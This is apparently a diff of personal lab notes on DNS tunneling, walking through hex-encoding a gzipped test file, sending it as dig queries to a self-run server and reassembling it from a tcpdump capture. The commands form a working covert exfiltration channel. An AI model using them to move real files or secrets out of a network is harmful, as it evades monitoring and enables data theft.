@@ -1,8 +1,6 @@
 # DNS tunneling
 
-<https://isc.sans.edu/diary/Packet+Tricks+with+xxd/10306/>
-
-<https://leonjza.github.io/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/>
+## https://isc.sans.edu/diary/Packet+Tricks+with+xxd/10306/
 
 Remote machine has IP 158.69.60.101 and domain name histfile.org.
 
@@ -106,3 +104,87 @@ first line
 second line
 third line
 ```
+
+## https://leonjza.github.io/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/
+
+```console
+ubuntu@histfile:~$ sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
+```
+
+```console
+ubuntu@laptop:~$ echo -e "line one\nline two\nline three" > message.txt
+ubuntu@laptop:~$ cat message.txt
+line one
+line two
+line three
+```
+
+```console
+gzip -k message.txt
+```
+
+```console
+ubuntu@laptop:~$ xxd -p message.txt.gz > message.hex
+```
+
+```console
+ubuntu@laptop:~$ awk '{ print "dig " $1 ".fake.io @histfile.org +short" }' message.hex
+dig 1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io @histfile.org +short
+dig e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io @histfile.org +short
+```
+
+
+
+```console
+ubuntu@histfile:~$ sudo tcpdump -i any -w /tmp/dns_capture.pcap 'port 53'
+tcpdump: data link type LINUX_SLL2
+tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+^C10 packets captured
+15 packets received by filter
+0 packets dropped by kernel
+```
+
+
+```console
+ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b.fake.io
+e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
+e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
+e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
+e5ca01314acaf3a18c8ca2d4542e002e188f571d000000.fake.io
+```
+
+
+```console
+ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name | cut -d '.' -f 1 | uniq
+1f8b08085d4a366900036d6573736167652e74787400cbc9cc4b55c8cf4b
+e5ca01314acaf3a18c8ca2d4542e002e188f571d000000
+```
+
+```console
+ubuntu@histfile:~$ tshark -r /tmp/dns_capture.pcap -T fields -e dns.qry.name | cut -d '.' -f 1 | uniq > message.hex
+```
+
+```console
+ubuntu@histfile:~$ xxd -p -r message.hex > message.txt.gz
+```
+
+
+```console
+ubuntu@histfile:~$ gunzip message.txt.gz
+```
+
+```console
+ubuntu@histfile:~$ cat message.txt
+line one
+line two
+line three
+```
+
+
+
